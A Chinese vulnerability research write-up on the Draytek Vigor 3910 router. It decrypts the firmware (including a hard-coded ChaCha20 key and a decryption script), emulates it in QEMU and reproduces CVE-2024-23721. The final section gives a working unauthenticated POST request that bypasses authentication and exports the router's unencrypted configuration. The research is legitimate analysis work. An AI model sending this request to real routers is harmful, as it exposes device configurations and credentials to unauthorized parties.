# Draytek3910 固件解密及漏洞分析
> Sakura
> 来源：https://www.iotsec-zone.com/article/479

# 固件信息
Draytek Vigor 3910是Draytek旗下的一款多WAN安全路由器。
厂商：Draytek
型号：Vigor 3910
固件版本：3971、4325

# 固件解密
首先对于Draytek的固件解密有[draytools](https://github.com/knightmare2600/draytools)这么一个工具，不过该工具所能支持的型号有限，当涉及到对应的型号固件时可以考虑使用[hexacon_draytek_2022_final](https://www.hexacon.fr/slides/hexacon_draytek_2022_final.pdf)中所展示的方式打造自己的draytools。
对于draytools不支持的型号，文章中也提出了，Vigor 3910是AARCH64的，并且在3.9.x与4.x版本有很大的不同，最直观的就是这两个版本的熵值是不同的。

V3.9.7.1
![0.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496bq0tb6cbsulbff.png)

V4.3.2.5
![1.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496c7ifxchnf1yehx.png)

从对两个版本的Firmware查看熵值后可以看到，在V3.9.7.1中是可以解析出特征的，但是V4.3.2.5并无法像V3.9.7.1一样解析出特征，因此可以大胆猜测V4.3.x.x可能进行了某种加密，使得我们无法直接对其进行获取。
然后通过文章我们知道，Firmware中使用了54 48 55 4E 44 45 52 58去分割 boot.bin，init.bin 和 ATF stage 1。

![2.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496gfh23gkat30ddm.png)
如上所示，我们通过010edit查找54 48 55 4E 44 45 52 58得到了每一个部分开始的地址。于是我们可以通过dd命令将其提取出来。
```
dd if=v3910_3971.all of=stage1.bin skip=262150 bs=16
或者
dd if=v3910_3971.all of=stage2.bin skip=4194400 bs=1
```
这里的262150是40006H的十进制表达。

![3.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496hkms1s2p5z7wvo.png)
获得stage1.bin后通过010edit查看内容，可以发现其中有BL1、BL31等内容。

![4.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496hy9di6lnsmaoyb.png)
这些字符是[ATF](https://chromium.googlesource.com/external/github.com/ARM-software/arm-trusted-firmware/+/v0.4-rc1/docs/firmware-design.md)中的内容，所以猜测，3910型号中使用了ATF技术。而参考ATF 启动流程，CPU 会先执行 BL1，BL1 通常被烧录在 ROM 中，BL1 完成初始化工作之后会通过 UUID 查找其他 BL 的位置，BL2、BL3、系统镜像等部分被单独打包在 fip.bin，存放到 flash 内。考虑到关键部分应该在 fip.bin，所以要想办法找到此文件并解包。
查看 ARM ATF 开源代码了解到fip.bin以0xAA640001开头。
```  
#define TOC_HEADER_NAME	0xAA640001
#define TOC_HEADER_SERIAL_NUMBER 0x12345678

toc_header = (fip_toc_header_t *)buf;
toc_header->name = TOC_HEADER_NAME;
toc_header->serial_number = TOC_HEADER_SERIAL_NUMBER;
toc_header->flags = toc_flags;
```
通过值去寻找位置。

![5.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496ikwc32aglabitm.png)
在文件中找到了位置，并且确定开头，然后通过dd提取。
```
dd if=stage1.bin of=fip.bin skip=262136 bs=1
```

![6.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496j114rgq8jxldbz.png)
然后使用ATF编译fiptool
```
git clone https://github.com/ARM-software/arm-trusted-firmware
cd arm-trusted-firmware
make fiptool
```

![7.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496khtcbt4js1c3ls.png)
生成的fip工具在`arm-trusted-firmware-master/tools/fiptool`下。

![8.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496jwcn3smtvnl3zp.png)
我们主要是用unpack对获得的fip.bin进行拆分。
```
./fiptool unpack ../../../3971/fip.bin 
```

![9.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496m9jl1kgcbg7gxh.png)
拆分完后会获得nt-fw.bin、soc-fw.bin以及tb-fw.bin。
而通过对与ATF源码的查看我们可以知道nt-fw.bin则是BL33。  

![10.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496mliows65mi1ode.png)
并且通过对ATF的[学习](https://www.cnblogs.com/arnoldlu/p/14175126.html)，我们可以了解到，在ATF的启动流程中，BL33部分一般为uboot或者内核部分。
```
    BL1 - AP Trusted ROM，一般为BootRom。
    BL2 - Trusted Boot Firmware，一般为Trusted Bootloader。
    BL31 - EL3 Runtime Firmware，一般为SML，管理SMC执行处理和中断，运行在secure monitor中。
    BL32 - Secure-EL1 Payload，一般为TEE OS Image。
    BL33 - Non-Trusted Firmware，一般为uboot、linux kernel。
```
在ATF中这一部分的修改，要相对修改其他部分容易，因为其可以是非可信部分。
因此去查看一下这部分。

![11.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496n053fwzoyooied.png)
查看BL33的hex值可以发现，其中有一些如`Decrypt file`、`expand 32-byte k`的字段，推测可能是在这里进行了解密的操作。
于是对这个文件进行逆向。

![12.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496n8kc6i1opunzkd.png)
在逆向的过程中发现了一个函数，其中有这么一串字符串`0DraytekKd5Jason3DraytekKd5Jason`长度符合32字节，且在下方有`Start to decrypt`，故这32字节长度的字符大概率就是这个加密算法的密钥。
然后在下方发现似乎是获取了名为`nonce`的值。

![13.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496nobz4759ctjvrb.png)
`nonce`值是固件头部中的一个内容，这个值的内容为：UODAjyXZOzH0，且长度为12字节。
如果不需要这个值那就不会去获取，因此结合上面的32字节密钥以及这个12字节的大概为偏移值。
可以大致推断可能是chacha20。

![14.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496nzyfykimkhvakl.png)
在分辨出大致的解密方向之后，我们需要判断该解密多大的数据。

![15.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496ob6zm3luyihkze.png)
从固件中可以以看到，加密的enc_Image是从0xF0处开始有`0x34A1A00`的大小。

![16.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496os22261z1cghmg.png)
通过dd将加密部分取出来。
```
dd if=v3910_4325.all of=enc_Image skip=15 count=3449248 bs=16(然后要删除前三字节)
或者
dd if=v3910_4325.all of=enc_Image skip=243 count=55187968 bs=1
```
然后通过对解密程序的分析，写出解密脚本对enc_Image进行解密。
```  
from Crypto.Cipher import ChaCha20

def do_decrypt(enc_Image):
    nonce = b"UODAjyXZOzH0"

    with open(enc_Image, "rb") as f:
        enc_data = f.read()
    
    key = b"0DraytekKd5Eason3DraytekKd5Eason"    # J to E
    cipher = ChaCha20.new(key=key, nonce=nonce)
    dec_data = cipher.decrypt(enc_data)

    with open(enc_Image + "_decrypted.bin", "wb") as f:
        f.write(dec_data)
    
    print("Done!")

if __name__ == "__main__":
    filename = "enc_Image.bin"
    do_decrypt(filename)
```

![17.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496p7x9uwwrdzxbyp.png)
对enc_Image进行解密之后，我们就可以考虑对解密后获得的镜像进行查看。
首先是考虑解密之后能否直接使用binwalk解包。

![18.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496q4edxyyesm498f.png)
但是很可惜，并不能怎么做。

![19.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496qelwutfjwzp3tr.png)
通过查看其熵值推断可能是压缩了。
接着就逆向查看一下内部有什么。

![20.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496qow4e27ub6ztyi.png)
通过字符串查找发现，存在有关于解压缩的内容，通过这些推断，可能存在lz4、xz、lzo。
为了确定使用了什么压缩算法，通过对`decompressor failed`进行交叉引用查看，发现在`sub_991c1c`中被引用。

![21.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496r47cmfrd3nelnf.png)
但是通过对该函数的查看发现并没有太多的线索可以确定使用了什么压缩的方式。
接着就对`sub_991c1c`交叉引用查看有没有上层函数。

![22.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496rddkm11pocckws.png)
对上层的`sub_991f9c`函数进行查看发现在函数最开始就对`sub_991c1c`进行了调用，并且这里所使用的值大都为全局变量。
分析`sub_991f9c`函数中对`sub_991c1c`的调用，其中首次调用中全局变量9DFC18是一个以0x184c2102开头的数据。

![23.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496s7goni24agtyb4.png)
而另一个全局变量是值为0x2A0B6D6的数。

![24.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496t7caj3n4nhqct6.png)
对于0x184c2102，通过对这个数的查看，可以了解到这是[lz4](https://blog.csdn.net/qq_16106195/article/details/140093549)压缩算法的魔法数。
因此可以确定解压enc_image_decrypted.bin需要使用lz4。
但还有一点我们不确定这个压缩后的数据大小的多少。不过既然前面使用了lz4的数据作为传参，那大胆猜测第二个数据指的是压缩后的数据大小。

![25.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496u29ruindqdcghr.png)
然后通过binwalk查看了enc_image_decrypted.bin发现，在0x9DFC18的位置也就是lz4魔法数的位置识别出了为lz4压缩。
因此我们就大致确定了提取压缩数据的起始地址以及大小。

![26.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496ugqupq95txm9m6.png)
```
dd if=enc_image_decrypted.bin of=lz4.bin bs=1 skip=10353688 count=44086998
```
然后提取出来后对其进行解压缩。

![27.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496v4m42kq9quccpl.png)
```
lz4 -d ./lz4.bin decompressed.bin
```

![28.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496vfd26l54x2ytfe.png)
解压缩完后binwalk查看发现是cpio文件，直接只用binwalk直接解压。
获得文件系统。

![29.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496vv1tjyxrqfmu91.png)
# 固件模拟
获得文件系统之后，通过对启动项的分析可以发现在最后会进入到firmware文件夹中去执行sh文件启动qemu虚拟机。这也符合参考文章中所说的内容——会启动一个qemu虚拟机去执行主要业务。
因此只要能让脚本正常启动就能够完成固件的模拟。

![30.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496wdkj9gg6rj29n5.png)
查看qemu启动时发现，这里使用的qemu有一个非常规的参数`-dtb DrayTek`，经过查看，在usr/bin下有一个qemu-system-aarch64，推测这个可能是开发时二开的qemu。
在firmware目录下有两个重要的脚本setup_qemu_linux.sh和run_linux.sh分别是网络设置脚本和启动脚本。
为了正常模拟起来，我们需要对这两个脚本进行修改。
将setup_qemu_linux.sh中的设置重置网络部分删除。（防止出现意外）
```
#reset switch to clear vlan settings in 3910 board
if [ -f /sbin/sw_setup ]; then
	sw_setup hw_reset; sw_setup sw_reset
fi
```
网络配置脚本：
```
#!/bin/bash

iflan=eth0
ifwan=eth1
mylanip="192.168.1.2"

brctl delbr br-lan
brctl delbr br-wan

ip link add br-lan type bridge
ip tuntap add qemu-lan mode tap
brctl addif br-lan $iflan
brctl addif br-lan qemu-lan
ip addr flush dev $iflan
ifconfig br-lan $mylanip
ifconfig br-lan up
ifconfig qemu-lan up
ifconfig $iflan up

ip link add br-wan type bridge
ip tuntap add qemu-wan mode tap
brctl addif br-wan $ifwan
brctl addif br-wan qemu-wan
ip addr flush dev $ifwan
ifconfig br-lan $mylanip
ifconfig br-wan up
ifconfig qemu-wan up
ifconfig $ifwan up

brctl show

#for speed test
ethtool -K $iflan gro off
ethtool -K $iflan gso off

ethtool -K $ifwan gro off
ethtool -K $ifwan gso off

ethtool -K qemu-lan gro off
ethtool -K qemu-lan gso off

ethtool -K qemu-wan gro off
ethtool -K qemu-wan gso off

#for telnet from linux to drayos 192.168.1.1
ethtool -K br-lan tx off
```
至于启动脚本依据参考文章中的内容进行修改。
启动脚本：
```  
#!/bin/bash
# 1. do "fw_setenv purelinux 1" first , then reboot
# 2. do setup_qemu_linux.sh (default P3 as WAN, P4 as LAN, for both 1Gbps connection only)
# 3. remember to recover to normal mode by "fw_setenv purelinux 0"

rangen() {
   printf "%02x" `shuf -i 1-255 -n 1`
}

rangen1() {
   printf "%x" `shuf -i 1-15 -n 1`
}

wan_mac(){
        idx=$1
        printf "%02x\n" $((0x${C}+0x$idx)) | tail -c 3 # 3 = 2 digit + 1 terminating character
}

A=$(rangen); B=$(rangen); C=$(rangen);
LAN_MAC="00:1d:aa:${A}:${B}:${C}"

if [ ! -p serial0 ]; then
    mkfifo serial0
fi
if [ ! -p serial1 ]; then
    mkfifo serial1
fi

platform_path="./platform"
echo "x86" > $platform_path
enable_kvm_path="./enable_kvm"
echo "kvm" > $enable_kvm_path

cfg_path="./magic_file"

echo "GCI_SKIP" > gci_magic

mkdir -p ../data/uffs
touch ../data/uffs/v3910_ram_flash.bin
uffs_flash="../data/uffs/v3910_ram_flash.bin"

echo "1" > memsize

(sleep 20 && ethtool -K qemu-lan tx off) &

model="./model"
echo "3" > ./model

rm -rf ./app && mkdir -p ./app/gci
GCI_PATH="./app/gci"
GCI_FAIL="./app/gci_exp_fail"
GDEF_FILE="$GCI_PATH/draycfg.def"
GEXP_FLAG="$GCI_PATH/EXP_FLAG"
GEXP_FILE="$GCI_PATH/draycfg.exp"
GDEF_FILE_ADDR="0x4de0000"
GEXP_FLAG_ADDR="0x55e0000"
GEXP_FILE_ADDR="0x55e0010"

echo "0#" > $GEXP_FLAG
echo "19831026" > $GEXP_FILE
echo "GCI_SKIP" > $GDEF_FILE

SHM_SIZE=16777216
./qemu-system-aarch64 -M virt,gic_version=3 -cpu cortex-a57 -m 1024 -L ../usr/share/qemu \
           -kernel ./vqemu/sohod64.bin $serial_option -dtb DrayTek \
           -nographic $gdb_serial_option $gdb_remote_option \
           -device virtio-net-pci,netdev=network-lan,mac=${LAN_MAC} \
           -netdev tap,id=network-lan,ifname=qemu-lan,script=no,downscript=no \
           -device virtio-net-pci,netdev=network-wan,mac=00:1d:aa:${A}:${B}:$(wan_mac 1) \
           -netdev tap,id=network-wan,ifname=qemu-wan,script=no,downscript=no \
           -device virtio-serial-pci -chardev pipe,id=ch0,path=serial0 \
           -device virtserialport,chardev=ch0,name=serial0 \
           -device loader,file=$platform_path,addr=0x25fff0 \
           -device loader,file=$cfg_path,addr=0x260000 \
           -device loader,file=$uffs_flash,addr=0x00be0000 \
           -device loader,file=$enable_kvm_path,addr=0x25ffe0 \
           -device loader,file=memsize,addr=0x25ff67 \
	        -device loader,file=$model,addr=0x25ff69 \
           -device loader,file=$GDEF_FILE,addr=$GDEF_FILE_ADDR \
           -device loader,file=$GEXP_FLAG,addr=$GEXP_FLAG_ADDR \
           -device loader,file=$GEXP_FILE,addr=$GEXP_FILE_ADDR \
           -device nec-usb-xhci,id=usb \
           -device ivshmem-plain,memdev=hostmem \
           -object memory-backend-file,size=${SHM_SIZE},share,mem-path=/dev/shm/ivshmem,id=hostmem
```
然后尝试执行，但没法启动。
于是尝试去编译一个。
首先从官方给出的[Vigor3910_GPL](https://gplsource.draytek.com/?dir=Vigor3910)中下载对应的GPL源码。
```
tar -xvjf new_v3910_v396_GPL_release.tar.bz2
```
使用tar对压缩包进行解压。

![31.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496x17xzmn74nqgjf.png)
然后按照readme中的内容进行操作。
```
sudo apt-get install make
sudo apt-get install gcc
sudo apt-get install liblz4-tool
./build
```
但是发现并没有我们要的qemu文件。
于是对GPL中的内容查找。

![32.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496yapr4zu3kqnzne.png)
在source下发现了一个qemu的压缩包，将其解压。
接着进入文件夹。
在`/Vigor3910_v396_GPL_release/source/qemu-2.12.1/linux/cavium-rootfs/src_dir/qemu-2.12.1`下进行编译。
```
./configure --enable-kvm --enable-debug --target-list=aarch64-softmmu
make
```
获得我们需要的qemu-system。
然后放到文件系统中的firmware中，分别运行network.sh和myrun.sh就可以模拟起来了。

![33.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496yl1jh4jfdeutj6.png)
# CVE-2024-23721
根据漏洞描述在process_post中发现了目录遍历问题。当发送某个POST请求时，它会调用函数并导出信息。
这种情况下去寻找这个process_post，然后分析漏洞点就可以了。
## 分析sohod64.bin
但是这个固件很特别，整个运行是通过qemu启动的，并且启动的文件sohod64.bin是Darytek自行实现的os系统。而这个sohod64.bin是个静态文件，并且没有符号表，所有相关函数都在这里面。
首先模拟起来之后先查看一下具体的web运行流程。

![34.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496yzwr2141iv1wxd.png)
可以发现，web的POST请求是通过cgi进行处理的。
对此可以通过逆向查找字符串尝试定位。
通过字符串定位在`0x40156840`处的存在大量对cgi文件的判断。
```
......

          iVar1 = FUN_406514d8(param_1,"/cfgimport.cgi");
          if (iVar1 == 0) {
            uVar2 = 0x1b68;
          }
          else {
            iVar1 = FUN_40651624(param_1,"/pkt_monitor.pcap",0x11);
            if (iVar1 == 0) {
              uVar2 = 0x1b6b;
            }
            else {
              iVar1 = FUN_40651624(param_1,"/dbglog.tar",0xb);
              if (iVar1 == 0) {
                uVar2 = 0x1b6c;
              }
              else {
                if (*param_1 == '/') {
                  uVar2 = FUN_40651424(s_V3910_42648e10);
                  iVar1 = FUN_40651624(param_1 + 1,s_V3910_42648e10,uVar2);
                  if ((iVar1 == 0) && (iVar1 = FUN_400348b4(param_1,"tr069_parms.xml"), iVar1 != 0 ))
                  {
                    return 0x1e63;
                  }
                }
                iVar1 = FUN_406514d8(param_1,"/check_swm_enable.cgi");
                if (iVar1 == 0) {
                  uVar2 = 0x2784;
                }
                else {
                  iVar1 = FUN_406514d8(param_1,"/cfgrest.cgi");
                  if (iVar1 == 0) {
                    uVar2 = 7000;
                  }
                  else if ((*param_1 == '/') && (iVar1 = FUN_400348b4(param_1,".ovpn"), iVar1 != 0 ))
                  {
                    uVar2 = 0x1b69;
                  }
                  else {
                    iVar1 = FUN_406514d8(param_1,"/Send_OVPN_Mail.cgi");
                    if (iVar1 == 0) {
                      uVar2 = 0x1b6a;
                    }
                    
......

  return uVar2;
```
对此推测这个函数是将请求的页面进行判断，然后转化为一个对应的值返回给上层。
所以对这个函数进行交叉引用查看。
在上层函数中发现有对从`0x40156840`获得的值进行比较，并且还有一个类似进行了认证检测的函数。
```  
    else if (local_8 < 0x1b6c) {
      if (local_8 == 0x1b67) {
        iVar1 = FUN_4010e084("/auth_check.cgi",param_1 + 5);
        if ((iVar1 != -1) && (iVar1 = check_sFormAuth(param_1[0x114d]), iVar1 != 0)) {
          iVar1 = FUN_401590c0(param_1,param_1[0xf3f]);
          if (iVar1 == 0) {
            FUN_400cf818(0x1b50,"cfg_gci_export_script");
          }
          else {
            FUN_400cf818(0x1b67,0);
          }
        }
      }
```
如果确实是认证检测，那就有可能进行绕过，因此有必要看一下。
可以发现在函数中会进行以及字符串检查。
```  
      uVar2 = FUN_40651424("/auth_check.cgi");
      iVar6 = FUN_40651624(funVar,"/auth_check.cgi",uVar2);
      if (iVar6 == 0) {
        local_4 = 0;
      }
      iVar6 = FUN_4074166c(funVar);
      if (iVar6 != 0) {
        local_4 = -1;
      }
```
当函数的第一个传参为特定的几个字符时才可以将检查数local_4置0，其他的值则是置1。
接着继续查看函数。
```
      *funVar = 0;
      if ((local_4 < 0) ||
         (iVar3 = FUN_4010ce00(local_10,&PTR_s_/v2000/_4264ffe0 + local_4 * 8), iVar3 != -1)) {
        DAT_4262a750 = DAT_47170a24;
        uVar7 = 1;
      }
      else {
        uVar7 = 0xffffffff;
      }
      return uVar7;
    }
```
然后在函数的最后有一个判断来决定这个函数的返回值，如果前面我们是0那这边FUN_1010ce00函数返回值要是真才可以。
这样就得查看一些这个函数。
由于我们在这需要的返回值是真，那么我们就在这个函数中查看什么时候返回值为真。
```  
  iVar2 = FUN_4011692c(param_1 + 0x3e2c,"/weblogin.htm");
  if (((iVar2 == 0) && (iVar2 = FUN_4011692c(param_1 + 0x3e2c,"/cgi-bin/wlogin.cgi"), iVar2 == 0))
     && ((iVar2 = FUN_4011692c(param_1 + 0x3e2c,"/doc/cgierr.htm"), iVar2 == 0 &&
         ((iVar2 = FUN_4011692c(param_1 + 0x3e2c,"/images/"), iVar2 == 0 &&
          (cVar1 = FUN_4010cd68(param_1 + 0x3e2c), cVar1 != '\0')))))) {
          .......
          
    }
  }
  return 1;
```
当函数中的这个if条件不满足时，回会跳过if中的语句，直到最后的return就会返回函数中唯一一个`return 1`。
在返回值条件满足后，FUN_4010e084函数的返回值就是1，接着就会去执行check_sFormAuth（FUN_40d16d34）。
看到这个函数我们发现，这个函数貌似是对POST传参进行处理的，处理了一个sFormAuthStr的值那么也就是说它的上层函数就是可能是我们在找的process_post。
```
    else if (local_8 < 0x1b6c) {
      if (local_8 == 0x1b67) {
        iVar1 = form_evaluate_access("/auth_check.cgi",param_1 + 5);
        if ((iVar1 != -1) && (iVar1 = check_sFormAuth(param_1[0x114d]), iVar1 != 0)) {
          iVar1 = FUN_401590c0(param_1,param_1[0xf3f]);
          if (iVar1 == 0) {
            FUN_400cf818(0x1b50,"cfg_gci_export_script");
          }
          else {
            FUN_400cf818(0x1b67,0);
```
那么当check_sFormAuth的返回值为0，就会进入到FUN_400cf818中。但是由于FUN_400cf818这个函数过于庞大了ghidra分析的冒烟了，于是看看ida能不能稍微分析一下（ida也寄了，能显示的最大块数突破了1000）并且查找有没有相关的分析。
## 漏洞分析
通过查看相关文章，这个FUN_400cf818就是我们需要进入的函数，并且只有在前面的判断满足进入到FUN_400cf818(0x1b50,"cfg_gci_export_script")时才会出现信息泄露。
那么我们分析一下怎么样才可以进入到这里。

![35.png](https://www.iotsec-zone.com/api/image/v2/20240918/d496zx0dji2mwipbo4.png)
首先是在process_post这个函数中会先通过translate_nameq去处理请求头，将请求的页面转译成对应的一串编码。
然后我们需要translate返回的结果是0x1b67，因此查看函数translate_name。

![36.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4970druh0kjovfgxf.png)
在translate中如果请求中有`Draytek.exp`就会返回0x1b67。（LAB_40f862c0在ida中可以看到对应的地址中存放的是`.exp`）
接着继续查看process_post。

![37.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4970lc0h98d71j5sj.png)
在process_post中经过判断进入到if之后还有判断要绕。
需要让form_evaluate_access的返回值不为-1。

![38.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4970qb1dzn7zz88zi.png)
发现真正掌管反函数返回值的是check_is_from_lan函数，只要这个函数返回值是1，那form_evaluate_access返回值就是1。就可以进入到下一个if条件中。
```  
  iVar2 = FUN_4011692c(param_1 + 0x3e2c,"/weblogin.htm");
  if (((iVar2 == 0) && (iVar2 = FUN_4011692c(param_1 + 0x3e2c,"/cgi-bin/wlogin.cgi"), iVar2 == 0))
     && ((iVar2 = FUN_4011692c(param_1 + 0x3e2c,"/doc/cgierr.htm"), iVar2 == 0 &&
         ((iVar2 = FUN_4011692c(param_1 + 0x3e2c,"/images/"), iVar2 == 0 &&
          (cVar1 = FUN_4010cd68(param_1 + 0x3e2c), cVar1 != '\0')))))) {
          .......
          
    }
  }
  return 1;
```
然后在check_is_from_lan中要让返回值为1需要我们对这在如上判断中不进入，否则有可能在其中的嵌套判断中返回-1。因此，我们只需要在Daytek.exp后再加上/images/就可以。
接着是这个if中的另一个条件我们需要让check_sFormAuth为1。

![39.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4970xqrv8bsvvanal.png)
check_sFormAuth在这个函数中可以看到只要存在`sFormAuthStr=`那么就会返回1。（FUN_40e334f8必定返回0）
所以什么再给请求中加入一个`sFormAuthStr=`参数值就可以绕过。
```  
POST /Draytek.exp/images/?sFormAuthStr= HTTP/1.1
Host: 192.168.1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

```
尝试构造poc，看能不能返回配置信息。

![40.png](https://www.iotsec-zone.com/api/image/v2/20240918/d497164cp01jan4a8y.png)
返回了乱码，那就是说可能还有加密解密的手段。
查看目标函数FUN_400cf818。
通过查看0x1b67在哪被使用可以跟踪到这个页面的执行流。

![41.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4971dby8yjgro9al7.png)
跟踪执行过程发现有一个chk_encryptcfg的参数。
然后通过FUN_40D1825C进行处理。

![42.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4971ib8tucvvtkbze.png)
接着在函数FUN_40A37D64中存在处理这个参数的值。

![43.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4971nicydae3fu5ir.png)
通过查看函数FUN_40A37D64了解到有三个值可以用，分别为170、187和204。

![44.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4971sxsc6hudnfrhu.png)
当chk_encryptcfg的值不为170、187和204这三个值时，就会加载一串密钥然后对内容进行加密处理。
若使用这三个值接着在这个函数中进行相对应的配置文件信息的输出。

![45.png](https://www.iotsec-zone.com/api/image/v2/20240918/d4971yrxvmqzwlaazj.png)
于是更新poc再试一次。
```
POST /Draytek.exp/images/?sFormAuthStr= HTTP/1.1
Host: 192.168.1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

chk_encryptcfg=170
```
成功复现。

![46.png](https://www.iotsec-zone.com/api/image/v2/20240918/d497254lsk78sx2ct1.png)
# 参考文献
[hexacon_draytek_2022_final](https://www.hexacon.fr/slides/hexacon_draytek_2022_final.pdf)
